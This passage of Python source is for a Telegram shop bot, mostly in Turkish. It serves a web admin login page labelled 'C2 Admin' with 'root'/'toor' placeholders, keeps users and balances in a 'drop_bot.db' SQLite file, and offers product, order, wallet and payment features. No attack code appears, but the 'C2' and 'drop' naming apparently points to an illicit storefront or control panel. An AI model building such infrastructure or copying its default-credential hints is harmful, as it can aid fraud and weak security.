            .login-card {{ background: #111827; padding: 35px; border-radius: 16px; border: 1px solid #1f2937; width: 100%; max-width: 350px; text-align: center; }}
            input {{ width: 100%; padding: 12px; margin: 10px 0; background: #090d16; border: 1px solid #374151; border-radius: 8px; color: white; box-sizing: border-box; }}
            button {{ background: #2563eb; color: white; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }}
        </style>
        </head>
        <body>
            <div class="login-card">
                <h2>🔐 C2 Admin Girişi</h2>
                <p style="color:#ef4444;">{error}</p>
                <form action="/admin-login" method="POST">
                    <input type="text" name="username" required placeholder="root">
                    <input type="password" name="password" required placeholder="toor">
                    <button type="submit">Giriş Yap</button>
                </form>
            </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(login_html.encode("utf-8"))

    def send_html_error(self, message):
        self.send_response(400)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(f"<h2>⚠️ {message}</h2>".encode("utf-8"))

def run_health_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SecureDropHandler)
    server.serve_forever()

threading.Thread(target=run_health_server, daemon=True).start()

# --- TELEGRAM BOT ANA DÖNGÜSÜ ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.type != "private":
        return
    user_id = message.from_user.id
    if is_user_banned(user_id):
        await message.answer("❌ Erişiminiz engellenmiştir.")
        return
    
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username, balance) VALUES (?, ?, 5.0)", (user_id, message.from_user.username))
    conn.commit()
    conn.close()

    lang = get_user_lang(user_id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇹🇷 Türkçe", callback_data="setlang_tr"), InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en")]
    ])
    await message.answer(LANG[lang]["welcome"], reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data.startswith("setlang_"))
async def set_language(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    new_lang = callback.data.split("_")[1]
    set_user_lang(user_id, new_lang)
    t = LANG[new_lang]
    await callback.answer()
    miniapp_url = f"{RENDER_EXTERNAL_URL}/miniapp"
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["btn_products"]), KeyboardButton(text=t["btn_orders"])],
            [KeyboardButton(text=t["btn_miniapp"], web_app=WebAppInfo(url=miniapp_url))],
            [KeyboardButton(text=t["btn_wallet"]), KeyboardButton(text=t["btn_support"])]
        ],
        resize_keyboard=True
    )
    await callback.message.edit_text(t["lang_set"])
    await callback.message.answer(t["welcome"], reply_markup=kb, parse_mode="Markdown")

async def main():
    global main_loop
    main_loop = asyncio.get_running_loop()
    asyncio.create_task(auto_backup_task())
    asyncio.create_task(background_payment_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
